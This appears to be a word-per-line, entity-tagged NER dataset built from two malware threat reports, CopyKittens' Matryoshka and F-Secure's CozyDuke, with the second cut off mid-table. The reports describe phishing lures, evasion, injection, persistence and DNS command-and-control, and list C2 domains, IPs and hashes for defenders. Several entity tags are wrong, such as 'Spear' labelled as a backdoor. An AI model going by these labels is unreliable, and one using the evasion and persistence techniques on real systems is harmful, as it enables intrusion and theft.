CopyKittens B_malware.backdoor
assembled
major
parts
of
their
attack
from
code
snippets
carefully
picked
from
public
repositories
and
online
forums
,
hence
their
nickname
.
We
also
named
their
attack
tool
'
Matryoshka'1  B_malware.unknown
due
to
the
fact
that
it
was
written
as
a
multi-stage
framework
,
with
each
part
of
it
built
to
integrate
its
subsequent
step
.

We
have
had
only
a
partial
window
to
the
targets
of
these
semi-sophisticated
yet
highly
effective
attacks
.

Among
them
were
high
ranking
diplomats
at
Israel's
Ministry
of
Foreign
Affairs
and
some
well-known
Israeli
academic
researchers
specializing
in
Middle
East
Studies
.

Even
if
we
combine
this
with
the
fact
that
attackers
goal
seemed
to
be
theft
of
sensitive
data
,
we
still
lack
the
ability
to
clearly
identify
who
is
behind
this
attacks
and
if
it
was
sponsored
by
another
major
actor
.

In
our
opinion
,
this
will
not
be
the
last
time
we
hear
from
this
group
.

Their
constant
striving
toward
improved
performance
,
the
fact
that
they
probably
executed
successful
attacks
and
the
current
turmoil
in
the
Middle
East
region
leads
us
to
the
conclusion
that
the
CopyKittens B_malware.backdoor
will
keep
striking
targets
with
similar
profiles
in
the
near
future
.

1
https://en.wikipedia.org/wiki/Matryoshka_doll B_url.normal

The
Group
Attack
Cycle

CopyKittens B_malware.backdoor
has
conducted
at
least
three
waves
of
cyber-attacks
in
the
past
year
.

In
each
of
the
attacks
the
infection
method
was
almost
identical
and
included
an
extraordinary
number
of
stages
used
to
avoid
detection
.

As
with
other
common
threat
actors
,
the
group
relies
on
social
engineering
methods
to
deceive
its
targets
prior
to
infection
.

Step
One
–
Spear B_malware.backdoor
Phishing  I

The
attack
is
initiated
by
sending
an
infected
document
file
as
an
email
attachment
.

In
most
cases
the
email
subjects
have
been
carefully
chosen
to
match
the
target's
interests
.

We
were
able
to
retain
a
copy
of
an
email
used
to
target
an
Israeli
ambassador
in
a
large
eastern
European
country
.

Some
of
the
emails
subjects
were
:
1
.

Registration
form
to
the
United
Nations
CTITF
(
Counter
Terrorism
Implementation
Task
Force
)
.
[Israeli
MFA]
questionnaire
-
URGENT–
An
original
paper
,
probably
stolen
in
previous
attacks2
.

The
email
contains
the
first
link
in
the
chain
,
a
word
document
,
containing
an
OLE
binary
object
.

2
https://malwr.com/analysis/ZDg3Nzg3MDM3MWQwNDdmNTgwYWRmOTJkNWFhYTQ0ZjY/ B_url.normal

The
embedded
binary
objects
in
the
lure
documents
contained
a
trailing
'
fdp.scr
'
in
their
names
with
a
special
invisible
Unicode
character
.
This
character
officially
described
as
'
Right-To-Left

Override
'
flips
the
directionality
of
the
string
from
its
position
and
onward
.

For
example
,
if
we
name
a
file
'
filename
[special
flipping
char]fdp.scr
'
it
will
be
displayed
as
'
filename
rcs.pdf
'
.

This
form
of
subterfuge
has
been
previously
employed
by
other
Middle
Eastern
threat
actors
such
as
'
Desert  B_malware.unknown
Falcons I
'
,
reported
by
Kaspersky3
and
by
elements
operating
in
Syria4
.

In
other
cases
,
the
document
includes
instructions
motivating
the
victim
to
enable
macro
code
execution
.

If
the
trap
is
successful
and
the
user
played
his
part
,
the
infection
stage
begins
.
3
https://securelist.com/blog/research/68817/the-desert-falcons-targeted-attacks/ B_url.normal
4
http://syrianmalware.com/ B_url.normal

Step
Two
-
Droppers  B_malware.unknown
Matryoshka  I

Unlike
most
malwares
,
CopyKittens B_malware.backdoor
'
tools
are
bound
to
each
other
.
The
Matryoshka  B_malware.unknown
infection
framework
is
built
of
three
parts
:

Dropper
o
Obfuscating
code
and
signaling
to
the
C2
that
the
file
has
been
executed
o
Launching
the
loader
and
using
it
to
execute
functions
.

o
Comparing
anti-analysis
logic
and
reporting
it
back
to
C2

Reflective
Loader
o
Employing
anti-debugging
and
anti-sandboxing
techniques
o
Runtime
API
Address
resolver
o
Covert
DLL
injection
of
the
RAT B_malware.backdoor
library
o
Persistence
file
on
disk

RAT B_malware.backdoor
component
o
Configuring
the
Reflective
Loader
to
survive
reboots
and
process
exits
o
DNS
Command
and
Control
communication
o
Common
RAT B_malware.backdoor
functionalities

Dropper
–
SCR
PE
File

Files
with
scr
extension
are
just
the
same
as
exe
executables
.

Windows
screen
savers
originally
used
this
extension
but
nowadays
medium-level
threat
actors
commonly
use
it
as
a
way
to
deceive
the
average
user
who
might
be
deterred
from
an
exe
file
extension
.

The
dropper
name
always
matched
the
promised
content
of
the
spear B_malware.backdoor
phishing  I
email
.

In
the
latest
version
of
the
dropper
,
the
lure
pdf
is
saved
to
the
user's
%TEMP%
folder
with
an
'
~st
'
prefix
and
random
number
,
followed
by
a
'
.pdf
'
extension
.

Once
the
file
has
been
successfully
saved
,
the
pdf
is
opened
and
displayed
to
the
user
via
ShellExecute
API
and
Open
command
.

This
is
done
to
lower
the
target's
suspicions
and
mask
the
true
functionality
of
the
executable
.

While
the
user
unsuspectingly
reads
the
document
,
the
following
routine
runs
hidden
in
the
background
:

The
malware
first
unpacks
the
'
Reflective
Loader
'
component
into
the
memory
and
signals
to
its
'
C2
parents
'
the
attack
has
been
executed
by
downloading
an
image
file
from
a
remote
server
.

The
URL
of
the
remote
file
is
built
out
of
two
constant
strings
which
again
might
suggest
some
kind
of
builder
to
this
platform
.


We
believe
the
first
string
to
be
a
unique
ID
of
the
target
or
sample
.


The
second
is
the
full
URL
–
'
HTTP://DOMAIN/'RandomString'/%s(TargetID)/'CampgainIdentifer'/'NameOFFile'.png  B_url.normal
'

After
signaling
to
the
attackers
,
the
malware
calls
a
specific
export
function
from
the
Reflective

Loader
named
'
_check
'
.
This
routine
is
a
copied
code
from
the
'
Pafish
'
open
source
project
,
led
by
Alberto B_malware.unknown
Ortega  I
(
@a0rtega)5
who
describes
it
as
:
'
A
demonstration
tool
that
employs
several
techniques
to
detect
sandboxes
and
analysis
environments
in
the
same
way
as
malware
families
do
'
.

Pafish
will
enumerate
and
look
for
known
virtualization
and
sandbox
artifacts
and
then
print
results
back
to
the
researcher
screen
.

Since
the
original
Pafish
code
is
built
to
improve
security
researchers
'
ability
to
discover
evasive
malware
,
the
CopyKittens B_malware.backdoor
group
has
modified
the
code
logic
.

Instead
of
printing
the
functions
'
results
back
to
the
user
,
the
code
will
now
assign
a
static
number
from
1-27
in
the
case
of
an
artifact
being
found
,
and
will
return
that
value
to
the
calling
function
(
the
SCR
dropper
in
this
case
)
.

Upon
returning
from
the
'
_check
'
function
,
the
dropper
will
perform
a
simple
comparison
and
if
an
analysis
machine
has
been
detected
,
it
will
signal
the
attackers
again
using
almost
the
same

URL
as
it
did
before
but
replacing
the
name
of
the
'
.png
'
file
to
the
letter
'
n
'
concatenated
with
the
number
of
the
artifact
found
by
Pafish
.

Below
is
a
table
demonstrating
the
artifacts
and
their
corresponding
value
:
sandbox
usernames
and
paths

Generic
sandbox
sleep
patch

DeleteFile
is
hooked

Sandboxie
sbiedll
is
injected

Wine
Linux
emulator
is
present

Running
in
Virtualbox
VM

Running
in
VMWARE
VM

Running
in
QEMU
VM
9-21
22-25
26,27
5
https://github.com/a0rtega/pafish B_url.normal

During
our
investigation
we
were
able
to
identify
an
example
of
this
behavior
in
a
VirusTotal
report
on
one
of
the
domains
used
by
the
attackers
:

We
believe
this
URL
was
submitted
by
a
target
or
other
researchers
analyzing
the
malware
.

After
alerting
the
attackers
they
have
been
discovered
,
the
dropper
will
try
to
delete
the
temporary
files
created
by
him
and
terminate
activity
of
the
infection
process
.

In
the
case
no
analysis
machine
is
found
,
Reflective
Loader
will
be
called
again
with
the
'
_dec
'
(
possibly
abbreviation
of
the
word
'
decrypt
'
)
and
the
third
stage
of
the
attack
will
commence
.

Step
Three
-
Reflective
Loader

In
an
attempt
to
increase
stealthiness
,
the
CopyKittens B_malware.backdoor
group
has
decided
to
use
another
open
source
project6
by
Stephen
Fewer
(
@stephenfewer
)
.
The
project
implements
a
remote
library
injection
technique
called
'
Reflective
DLL
Injection
'
.
Fewer
describes
the
method
in
his
paper7
:
'
Reflective
DLL
injection
is
a
library
injection
technique
in
which
the
concept
of
reflective
programming
is
employed
to
perform
the
loading
of
a
library
from
memory
into
a
host
process
'
.

This
method
enables
the
RAT
library
to
run
on
the
host
machine
without
a
dedicated
process
and
without
registration
of
the
library
under
the
loaded
modules
.

The
original
project
was
built
as
a
command
line
utility
with
the
target
process
identifier
provided
as
an
argument
.
In
a
real
attack
scenario
,
the
injected
process
identifier
is
obviously
unknown
to
the
attacker
and
a
suitable
host
process
should
be
located
at
runtime
.
The
CopyKittens B_malware.backdoor
group
has
implemented
this
routine
by
using
WTSEnumerateProcess
API
to
get
a
list
of
current
active
processes
and
then
trying
to
get
a
handle
to
each
process
via
OpenProces
API
,
avoiding
x64
processes
.
6
https://github.com/stephenfewer/ReflectiveDLLInjection  B_url.normal
7
http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf B_url.normal

Once
a
suitable
host
has
been
found
for
infection
,
the
rest
of
Fewer's
project
code
will
be
used
to
inject
the
malicious
library
and
execute
the
RAT B_malware.backdoor
.

Step
Four
-
RAT
Component

The
main
part
of
'
Matryoshka  B_malware.unknown
'
is
a
remote
administration
tool
library
.

It
is
f
to
exist
in
the
infected
computer
memory
and
is
never
written
to
the
computer's
physical
disk
itself
.

When
we
'
dumped
'
the
RAT
to
the
disk
,
some
of
the
AV
tools
detect
it
with
the
following
signatures
:

Trojan.Jectin B_malware.backdoor
identified
on
April
9th
2015
by
Symantec8
.

Troj/Agent- B_malware.unknown
that
was
identified
on
March
25th
2015
by
Sophos9
.

This
,
however
,
is
not
the
case
while
the
RAT
is
injected
into
a
legitimate
host
process
.

Runtime
API
Address
Resolution

Since
the
library
is
injected
into
memory
,
the
imported
functions
must
be
resolved
in
runtime
,
to
solve
this
problem
the
CopyKittens B_malware.backdoor
group
used
a
method
called
'
Runtime
API
Address

Resolution'10
using
the
LoadLibrary
and
GetProcAddress
APIs
.

In
order
to
evade
static
virus
scanners
in
new
version
of
the
RAT B_malware.backdoor
,
the
attackers
obfuscated
the
names
of
the
API
functions
.

They
resolve
them
in
runtime
using
a
simple
substitute
cipher
combined
with
Base64
encoding
.
The
same
trick
was
used
in
the
Reflective
Loader
component
.

We
retrieved
the
original
functions
names
as
plaintext
strings
by
using
a
simple
Python
script
.
A
list
of
decrypted
API
strings
and
the
python
code
can
be
found
in
the
Appendix
and
Minerva
Labs
Research
GitHub
repository11
.

Installation
and
Persistence

Since
the
RAT B_malware.backdoor
library
was
built
to
run
from
the
memory
of
a
host
process
,
it
relies
on
the
loader
to
survive
system
restart
.
The
first
time
the
RAT B_malware.backdoor
runs
,
it
will
copy
the
reflective
loader
,
named
'
kernel.dll
'
to
one
of
Windows
'
common
folders
and
will
create
a
registry
key
named
{0355F5D0467C-30E9-894C-C2FAEF522A13} B_hash
under
'
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
'
with
the
value
of
'
C:\Windows\System32\rundll32.exe
'
\%LOCATION%\kernel.dll
'
_dec
'
to
rerun
the
injection
routine
after
each
boot
.

In
addition
,
to
make
sure
the
RAT B_malware.backdoor
always
runs
(
since
host
process
might
be
closed
or
crash
)
,
the

RAT B_malware.backdoor
creates
a
task
in
the
Windows
task
scheduler
named
'
Microsoft
Boost
Kernel
Optimization
'
which
will
re-run
the
injection
routine
every
20
minutes
.

The
task
scheduler
method
has
also
been
added
to
the
newest
version
of
the
RAT
.

8
http://www.symantec.com/security_response/earthlink_writeup.jsp?docid=2015-040923-3643-99 B_url.normal
9
https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/Troj~Agent-  B_url.normal

AMEY/detailed-analysis.aspx I
https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/a_museu B_url.normal
m_of_api_obfuscation_on_win32.pdf I
11
https://github.com/MinervaLabsResearch/BlogPosts  B_url.normal

This
makes
the
RAT B_malware.backdoor
unstable
as
multiple
instances
may
be
executed
simultaneously
on
the
same
host
machine
causing
unexpected
behavior
.

To
reduce
this
risk
,
the
authors
have
used
a
global
mutex
.

DNS
Command
&
Control

The
RAT B_malware.backdoor
uses
DNS
protocol
to
communicate
with
the
attackers
C2
server
.

The
DNS
queries
are
constructed
from
the
following
sections
:
1
.
C2
domain
name

2
.
The
unique
ID
of
the
infected
machine
(
computer
name
+
HD
serial

3
.
Random
string

4
.
Data
to
be
transmitted
.

To
make
traffic
analysis
and
detection
more
difficult
,
the
group
uses
a
substitute
cipher
to
obfuscate
the
data
before
it
is
sent
to
the
C2
:

Another
way
used
to
disguise
the
DNS
traffic
and
lower
the
suspicions
of
SOC
and
NOC
teams
was
the
use
IPs
from
address
blocks
of
Microsoft
and
McAfee
in
the
C2
responses
:

Once
a
command
is
received
from
the
C2
server
in
the
DNS
response
,
the
RAT B_malware.backdoor
will
translate
it
to
a
corresponding
command
.

For
example
,
when
the
C2
sends
a
DNS
response
with
the
IP
address
134.170.185.13  B_ip.normal
,
the
RAT
will
try
and
steal
outlook
passwords
.

Common
RAT B_malware.backdoor
Capabilities

Outlook
passwords

This
functionality
resembles
a
method
described
by
SecurityExploded
12
for
'
Recovering

Passwords
from
Outlook B_malware.unknown
2002-2013
'
.

We
can
assume
that
the
group
has
copied
this
code
as
well
.

Screen
Grabbing
and
Keylogging

This
RAT B_malware.backdoor
is
also
capable
of
screen
grabbing
and
keylogging
.

Unsurprisingly
,
here
too
we
were
able
to
trace
back
a
portion
of
the
original
source
code
from
the
popular
rohitab.com
online
forum13
.
12
http://securityxploded.com/outlookpasswordsecrets.php B_url.normal
(
Recovering
Passwords
from
Outlook
20022013
)
13
http://www.rohitab.com/discuss/topic/40069-keylogging-all-users-across-windows-7-professional/  B_url.unknown

Another
interesting
fact
is
that
the
author
also
copied
the
registry
key
described
in
the
installation
stage
above
,
replacing
only
a
single
character
of
the
original
randomly
generated
unique
ID
.

Improvement
Over
Time

In
comparing
samples
from
different
attack
cycles
,
we
can
easily
see
that
the
attackers
have
spent
time
improving
their
tool
,
making
it
more
persistent
and
harder
to
detect
.

For
example
,
between
the
first
versions
of
the
RAT B_malware.backdoor
and
the
latest
,
the
group
started
to
resolve
more
API
during
runtime
,
using
obfuscated
strings
.

A
comparison
of
the
outlook
password
extraction
function
from
previous
and
current
RAT B_malware.backdoor
versions
can
be
seen
below
.

In
addition
,
the
group
has
been
adding
anti
sandboxing
techniques
,
such
as
the
code
from
Pafish
described
above
and
anti-debugging
methods
:

This
anti-debugging
code
seems
to
have
been
copied
from
CodeProject14
,
a
well-known
online
source
.
14
http://www.codeproject.com/Articles/30815/An-Anti-Reverse-Engineering-Guide B_url.normal

Minerva
Labs

About
Us

ClearSky
Cyber
Security

Clearsky
is
a
cybersecurity
consulting
and
intelligence
company
.

We
provide
strategic
consulting
,
threat
intelligence
,
solutions
and
services
–
all
in
the
cyber
domain
.

Our
team
of
highly
experienced
cyber
infoworkers
,
analysts
and
researchers
constantly
run
a
targeted
and
extensive
evaluation
of
cyber
threats
and
risks
.

They
generate
breaking
alerts
,
updates
,
advisories
and
notifications
for
security
and
operations
centers
,
IT
,
risk
officers
,
and
management
.

We
help
our
customers
stay
ahead
of
threats
,
make
the
necessary
adjustments
to
organizational
policies
and
procedures
,
and
re-configure
and
adapt
security
and
IT
systems
.

We
assist
and
coach
the
organization
to
formulate
and
implement
a
cyber-event
handling
program
and
crisis
level
situation
assessment
and
decision
making
.

info@clearskysec.com
http://www.clearskysec.com  B_url.normal

Minerva
offers
a
low
footprint
endpoint
protection
platform
.

Minerva
brings
a
completely
new
paradigm
to
the
malware
detection
problem
,
focusing
on
preventing
malware
execution
by
using
the
malware's
strengths
against
it
.

The
security
platform
simultaneously
empowers
existing
security
products
and
improves
detection
rates
,
thus
exponentially
client
organization's
overall
return
on
security
investment
.

Time
is
of
the
essence;
when
it
comes
to
data
breaches
there
is
often
significant
damage
by
the
time
a
threat
is
detected
.

improving

Minerva
-Don't
chase
,
Prevent
!
info@minerva-labs.com
http://www.minerva-labs.com B_url.normal

Appendix
A
–
Spear B_malware.backdoor
Phishing  I
Examples

April
2015
:
'
Registration
Form
to
the
United
Nations
CTITF
'

February
2015
:
'
Israeli
Ministry
of
Foreign
Affairs
Questionnaire
'

Embedded
in
the
Word
document
was
Quest__fdp.scr
,
disguised
as
PDF

Early
2015
:
'
Israel
Ministry
of
Foreign
Affairs
Diplomatic
List
'

Early
2015
:
'
Strike
in
the
Ministry
of
Foreign
Affairs
'

Appendix
B
–
Indicators
of
Compromise

C2
Domains
img.gmailtagmanager[.]com B_url.cncsvr
windowkernel[.]com  B_url.cncsvr
windowslayer[.]in B_url.cncsvr
windowkernel[.]com  B_url.cncsvr
wheatherserviceapi[.]info B_url.cncsvr
wethearservice[.]com  B_url.cncsvr
windowslayer[.]in B_url.cncsvr
u[.]mywindows24[.]in  B_url.cncsvr
main[.]windowskernel14[.]com  B_url.cncsvr
walla[.]link  B_url.cncsvr
heartax[.]info  B_url.cncsvr
haaretz[.]link  B_url.cncsvr

Haaretz-News[.]com  B_url.cncsvr
gmailtagmanager[.]com B_url.cncsvr
fbstatic-a[.]xyz  B_url.cncsvr
fbstatic-a[.]space  B_url.cncsvr
fbstatic-akamaihd[.]com B_url.cncsvr
alhadath[.]mobi B_url.cncsvr
big-windowss[.]com  B_url.cncsvr
kernel4windows[.]in B_url.cncsvr
micro-windows[.]in  B_url.cncsvr
mywindows24[.]in  B_url.cncsvr
patch7-windows[.]com  B_url.cncsvr
patch8-windows[.]com  B_url.cncsvr
patchthiswindows[.]com  B_url.cncsvr
windows-10patch[.]in  B_url.cncsvr
windows-drive20[.]com B_url.cncsvr
windows-india[.]in  B_url.cncsvr
windows-kernel[.]in B_url.cncsvr
windows-my50[.]com  B_url.cncsvr
windows24-kernel[.]in B_url.cncsvr
windowskernel[.]in  B_url.cncsvr
windowslayer[.]in B_url.cncsvr
windowssup[.]in B_url.cncsvr
windowsupup[.]com B_url.cncsvr
mswordupdate15[.]com  B_url.cncsvr
(
currently
sinkholed
by
Kaspersky
)
mswordupdate16[.]com  B_url.cncsvr
(
currently
sinkholed
by
Kaspersky
)
mswordupdate17[.]com  B_url.cncsvr
(
currently
sinkholed
by
Kaspersky
)
cacheupdate14[.]com B_url.cncsvr
(
currently
sinkholed
by
Kaspersky
)
windowskernel14[.]com
(
currently
sinkholed
by
Kaspersky
)

C2
IP
Addresses
(
All
of
the
IP
addresses
bellow
are
hosted
in
XLHost.com
)
209.190.20.147  B_ip.cncsvr
209.190.20.149  B_ip.cncsvr
209.190.20.148  B_ip.cncsvr

Hashes
0feb0b50b99f0b303a5081ffb3c4446d  B_hash
cfb4be91d8546203ae602c0284126408  B_hash
d2c117d18cb05140373713859803a0d6  B_hash
1cef128513c05837f24796042b8e1cd9  B_hash
f10135e03df18462c2e35eac13d61435  B_hash
4765369d8ae52f2dd9b318e0c8b27054  B_hash
5e545dae692ecb4bddacdb9c526b1f16  B_hash
8734f46d932f179161042ef5b4a7b8a8  B_hash
9853fc1f4d7ba23d728f4ee80842faf9  B_hash
9db2719a3dde09ae260def9cd0d46dbe  B_hash
1f9910cafe0e5f39887b2d5ab4df0d10  B_hash
577577d6df1833629bfd0d612e3dbb05  B_hash
da529e0b81625828d52cd70efba50794  B_hash
098e8dd0e874e59817f2e78cd48e58f3  B_hash
32261fe44c368724593fbf65d47fc826  B_hash
38cb64ba0aafb86585d9bcbd1c500416  B_hash
6d8d0f7d73a9afaee667d71273e6e5e2  B_hash
bad36581f72aa2d8597dd2b1bc7b2a7f  B_hash
bcf93595ba4586b6324963e989349319  B_hash
CozyDuke  B_malware.drop

TLP
:
WHITE

CONTENTS

Introduction

The
CozyDuke  B_malware.drop
toolset

Attack
overview

Infection
vector

Target
details

Timeline

Attribution
&
links

Technical
Details

Initial
infection

CozyDuke  B_malware.drop
main
dropper

CozyDuke  B_malware.drop
main
component

Overview

Persistence

Configuration
data

Command
and
control
communication

Tasks

Modules

Executables

CozyDuke  B_malware.drop
Evolution

CozyDuke  B_malware.drop
Terminology
and
Naming

Appendix
A
|
Sample
hashes

Appendix
B
:
IOCs

This
whitepaper
provides
an
overview
of
CozyDuke  B_malware.drop
,
a
set
of
tools
used
by
one
or
more
malicious
actors
for
performing
targeted
attacks
against
high
profile
organizations
,
such
as
governmental
organizations
and
other
entities
that
work
closely
with
these
institutions
.

The
CozyDuke  B_malware.drop
toolset
,
which
we
believe
has
been
under
active
development
since
at
least
2011
,
consists
of
tools
for
infecting
targeted
hosts
,
establishing
and
maintaining
backdoor
access
to
the
hosts
,
gathering
information
from
them
and
gaining
further
access
to
other
hosts
inside
the
victim
organization
.

Based
on
command
and
control
(
C&C
)
server
information
found
being
used
by
CozyDuke  B_malware.drop
tools
,
we
believe
the
CozyDuke  B_malware.drop
toolset
is
used
by
at
least
one
malicious
actor
who
also
uses
,
or
at
the
least
shares
,
infrastructure
with
actors
using
the
known
threats
,
MiniDuke
and
OnionDuke
.

F-SECURE
LABS

SECURITY
RESPONSE

Malware
analysis

Whitepaper

INTRODUCTION

Target
details

THE
CozyDuke  B_malware.drop
TOOLSET

CozyDuke  B_malware.drop
,
as
referred
to
in
this
document
,
is
a
set
of
tools
used
by
one
or
more
malicious
actors
for
performing
targeted
attacks
against
high
profile
organizations
.

The
core
of
the
CozyDuke  B_malware.drop
toolset
is
a
modular
attack
platform
consisting
of
a
main
component
augmented
by
a
set
of
additional
modules
implementing
further
functionality
.

The
CozyDuke  B_malware.drop
toolset
also
includes
multiple
kinds
of
droppers
for
infecting
hosts
with
CozyDuke  B_malware.drop
or
for
executing
additional
tools
from
the
CozyDuke  B_malware.drop
toolset
.

Finally
,
the
CozyDuke  B_malware.drop
toolset
includes
tools
and
scripts
–
some
custom-written
,
others
based
on
openly
available
tools
–
that
are
used
for
purposes
such
as
gathering
further
information
from
infected
hosts
or
for
infecting
additional
hosts
in
the
same
target
organization
.

ATTACK
OVERVIEW

Infection
vector

We
have
observed
CozyDuke  B_malware.drop
being
spread
via
email
,
which
usually
contain
a
link
to
a
compromised
website
hosting
a
ZIP
file
(
although
in
at
least
one
case
,
the
file
was
hosted
on
Dropbox
)
.

These
files
contain
an
executable
that
,
upon
execution
,
will
write
to
disk
and
execute

CozyDuke  B_malware.drop
,
while
at
the
same
time
presenting
the
user
with
a
decoy
to
divert
attention
.

The
decoy
is
usually
an
uninteresting
PDF
,
but
we
have
also
observed
a
Flash
video
of
monkeys
being
presented
as
the
decoy
.

We
have
reason
to
believe
CozyDuke  B_malware.drop
is
being
used
to
target
governmental
organizations
and
entities
that
work
closely
with
such
bodies
.

Timeline

We
believe
the
current
CozyDuke  B_malware.drop
activity
started
at
the
end
of
January
2015
.

Most
of
the
samples
we
have
observed
were
compiled
beginning
from
the
end
of

January
.
However
,
based
on
comparisons
of
recent

CozyDuke  B_malware.drop
samples
against
older
samples
we
have
obtained
dating
back
as
far
as
the
end
of
2011
,
we
believe

CozyDuke  B_malware.drop
has
been
under
active
development
since
at
least
2011
.

Attribution
&
links

We
have
strong
evidence
suggesting
the
group
using

CozyDuke  B_malware.drop
is
the
same
as
-
or
at
the
least
shares
command
and
control
infrastructure
with
-
the
group
or
groups
using
MiniDuke
and
OnionDuke
.

Firstly
,
a
CozyDuke  B_malware.drop
sample
from
February
of
2012
attempts
to
contact
a
C&C
server
at
nostressjob.com
.

This
domain
has
previously
been
associated
with
known
MiniDuke
C&C
infrastructure
.
This
same
infrastructure
has
also
been
seen
in
use
by
OnionDuke
.
Secondly
,
we
also
have
reason
to
believe
CozyDuke  B_malware.drop
has
,
in
some
instances
,
downloaded
and
executed
droppers
for
DLL
files
reminiscent
of

OnionDuke
.
Specifically
,
the
DLLs
dropped
have
used
file
and
export
names
also
used
by
OnionDuke
.
Additionally
,
the
strings
in
the
DLLs
have
been
encrypted
using
the
same
algorithm
used
by
OnionDuke
.
This
link
is
,
however
,
not
as
conclusive
as
the
infrastructure
overlap
.

FIGURE
1
:
C&C
INFRASTRUCTURE
CONNECTIONS

BETWEEN
CozyDuke  B_malware.drop
,
MINIDUKE
AND
ONIONDUKE

CozyDuke  B_malware.drop

MiniDuke

OnionDuke
nostressjob.com
grouptumbler.com
overpict.com
postmaster@grouptumbler.com

John
Kasai

CozyDuke  B_malware.drop
Malware
analysis
TECHNICAL
DETAILS

INITIAL
INFECTION

Infection
with
CozyDuke  B_malware.drop
begins
with
the
victim
receiving
an
email
containing
a
link
to
a
ZIP
file
.

This
ZIP
file
will
contain
a
single
executable
,
usually
a
self-extracting
RAR
archive
.
Upon
execution
,
it
will
write
two
files
to
disk
.

The
first
file
is
a
decoy
.

The
decoy
has
usually
been
a
PDF
document
but
Flash
videos
have
also
been
observed
in
some
cases
.

The
second
file
extracted
from
the
archive
is
a
CozyDuke  B_malware.drop
dropper
.
This
dropper
will
then
proceed
to
write
to
disk
the
main
CozyDuke  B_malware.drop
components
as
well
as
an
encrypted
configuration
file
used
by
CozyDuke  B_malware.drop
.

FIGURE
2
:
THE
CozyDuke  B_malware.drop
INFECTION
FLOW

Malicious
link

ZIP
file

Downloads

ZIP
file

Extracts

Self-extracting

Extracts

Extracts

CozyDuke  B_malware.drop
main
dropper

Decoy
document

CozyDuke  B_malware.drop
MAIN
DROPPER

The
main
CozyDuke  B_malware.drop
dropper
,
used
for
infecting
hosts
with
CozyDuke  B_malware.drop
,
begins
by
checking
whether
the
victim
has
an
anti-virus
product
installed
.

Should
an
installed
product
be
found
,
it
will
be
compared
to
a
predetermined
list
of
product
names
.

If
the
installed
product
matches
a
name
on
the
list
,
the
dropper
will
immediately
exit
.

Newer
versions
of
the
dropper
will
perform
additional
checks
to
ensure
the
dropper
is
not
being
executed
inside
a
virtual
machine
or
a
known
malware
analysis
sandbox
environment
.

Should
either
of
these
checks
fail
,
the
dropper
will
likewise
exit
immediately
.

Next
,
the
dropper
will
find
and
decrypt
encrypted
data
stored
as
two
PE
resources
embedded
in
the
executable
.

These
resources
are
named
with
the
hexadecimal
identifiers
0x000A
and
0x000B
.

Both
resources
are
structured
similarily
.

They
begin
with
a
four-byte
value
specifying
the
length
of
the
included
decryption
key
.

This
decryption
key
immediately
follows
the
length
field
.

Finally
,
the
rest
of
the
resource
is
the
encrypted
payload
.

The
encryption
used
is
a
simple
XOR
with
a
rotating
key
.

The
first
resource
,
0x000A
,
contains
as
its
payload
a

Microsoft
cabinet
archive
.

This
archive
contains
the

CozyDuke  B_malware.drop
components
that
the
dropper
will
later
install
on
the
victim
system
.

The
second
resource
,
0x000B
,
contains
as
its
payload
an
XML
file
with
instructions
for
the
dropper
on
where
to
install
the
dropped
components
and
what
to
name
them
.

The
dropper
will
then
proceed
to
write
the
CozyDuke  B_malware.drop
components
to
the
specified
location
.

The
dropper
will
additionally
copy
the
system
file
rundll32.exe
to
the
install
location
for
CozyDuke  B_malware.drop
.

This
file
will
also
use
a
name
specified
in
the
droppers
configuration
file
.

Finally
,
the
dropper
will
use
the
copy
of
rundll32.exe
to
load
and
execute
the
CozyDuke  B_malware.drop
main
component
.

Encrypted
configuration
file

CozyDuke  B_malware.drop
components

CozyDuke  B_malware.drop
Malware
analysis
4

CozyDuke  B_malware.drop
MAIN
COMPONENT

Overview

The
main
component
of
CozyDuke  B_malware.drop
is
a
DLL
file
responsible
for
orchestrating
all
of
CozyDuke's  B_malware.drop
activity
on
a
victim
machine
.
The
main
component
is
executed
by
the
CozyDuke  B_malware.drop
dropper
using
a
copy
of
rundll32.exe
.

The
entrypoint
function
varies
,
but
is
always
specified
in
the
dropper
configuration
.

The
most
important
functionalities
offered
by
the
main
component
are
establishment
of
persistence
,
gathering
of
basic
system
information
,
communication
with
the
C&C
server
and
the
execution
of
additional
tasks
,
modules
or
executables
as
commanded
by
the
C&C
server
.

Persistence

CozyDuke  B_malware.drop
may
use
multiple
techniques
for
establishing
persistence;
the
following
is
one
technique
used
.

Firstly
,

CozyDuke  B_malware.drop
may
set
itself
to
be
executed
at
system
startup
by
adding
a
registry
value
under
any
of
the
following
registry
keys
:
•
HKLM\Software\Microsoft\Windows\

CurrentVersion\Run\
•
HKCU\Software\Microsoft\Windows\

CurrentVersion\Run\
•
HKLM\Software\Microsoft\Windows\

CurrentVersion\Policies\Explorer\Run
•
HKCU\Software\Microsoft\Windows\

CurrentVersion\Policies\Explorer\Run

The
name
of
the
registry
value
will
usually
be
the
filename
,
(
without
the
extension
)
of
the
CozyDuke  B_malware.drop
main
component
.

CozyDuke  B_malware.drop
may
also
register
itself
as
a
Windows
service
or
scheduled
task
.

Additionally
,
CozyDuke  B_malware.drop
may
utilize
a
technique
known
as
COM-object
hijacking
[1]
to
establish
persistence
.

To
achieve
this
,
CozyDuke  B_malware.drop
will
'
hijack
'
the
registry
entries
for
the
COM
object
'
SharedTaskScheduler
'
.

CozyDuke  B_malware.drop
will
modify
the
registry
entries
in
such
a
way
that
any
loading
of
the

SharedTaskScheduler
COM
object
will
first
load
a
special

CozyDuke  B_malware.drop
module
that
will
ensure
CozyDuke  B_malware.drop
stays
active
on
the
victim
host
.

Configuration
data

The
configuration
data
for
CozyDuke  B_malware.drop
is
stored
as
a
separate
RC4-encrypted
file
that
is
written
to
disk
by
the

CozyDuke  B_malware.drop
dropper
during
initial
infection
.
The
name
of
the
encrypted
configuration
file
on
disk
has
been
racss
.

dat
in
all
of
the
observed
cases
.
The
decrypted
file
is
formatted
as
XML
with
the
UTF-16LE
character
encoding
.

FIGURE
3
:
SCREENSHOT
OF
A
DECRYPTED
CozyDuke  B_malware.drop
CONFIGURATION
FILE

CozyDuke  B_malware.drop
Malware
analysis
TABLE
1
:
DETAILS
OF
KNOWN
CozyDuke  B_malware.drop
C&C
SERVERS

Dropper
SHA1

Protocol

Domain/IP

Path
75aeaee253b5c8ae701195e3b0f49308f3d1d932  B_hash
75aeaee253b5c8ae701195e3b0f49308f3d1d932  B_hash
